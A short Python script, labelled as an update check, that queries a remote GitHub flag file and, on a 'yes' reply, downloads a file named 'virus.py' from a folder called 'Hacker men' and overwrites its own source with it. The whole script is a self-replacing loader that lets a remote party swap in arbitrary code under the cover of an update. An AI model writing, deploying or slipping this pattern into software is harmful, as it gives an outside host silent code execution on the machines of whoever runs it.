# check for updates
import requests
import os

check_for_update = "https://raw.github.com/OomsOoms/cloud_stoage/main/Hacker%20men/Check%20for%20update"
response = requests.get(check_for_update)

if "yes" in str(response.content):
    check_for_update = "https://raw.github.com/OomsOoms/cloud_stoage/main/Hacker%20men/virus.py"
    response = requests.get(check_for_update)
    open(os.path.basename(__file__), "wb").write(response.content) 
# new version
